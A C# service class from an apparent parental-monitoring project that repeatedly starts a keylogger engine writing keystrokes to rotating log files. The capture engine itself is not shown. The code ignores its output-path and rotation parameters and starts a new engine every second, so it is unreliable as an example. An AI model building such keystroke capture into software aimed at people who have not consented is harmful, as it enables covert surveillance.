namespace ParentalSight.Core.Keylogger
{
    using Microsoft.Extensions.Logging;
    using ParentalSight;
    using ParentalSight.Core.Screenshot;
    using ParentalSight.Keylogger.Engines;
    using System;
    using System.Collections.Generic;
    using System.Text;
    using System.Threading;
    using System.Threading.Tasks;

    internal class KeyloggerService : IKeyloggerService
    {
        private readonly ILogger<KeyloggerService> _logger;

        public KeyloggerService(ILogger<KeyloggerService> logger)
        {
            _logger = logger;
        }

        public async Task StartAsync(long logRotationInMilliseconds, string outputPath, CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
                var log = new FilenameBuilder()
                    .WithPrefix("logger-")
                    .WithExtension("log")
                    .Build();
                var engine = new KeyboardLoggerEngine(log);
                //engine.StartKeylogger(DateTime.Now.AddMilliseconds(logRotationInMilliseconds));
                engine.StartKeylogger(DateTime.Now.AddMinutes(10));
                await Task.Delay(1000, stoppingToken);
            }
        }
    }
}
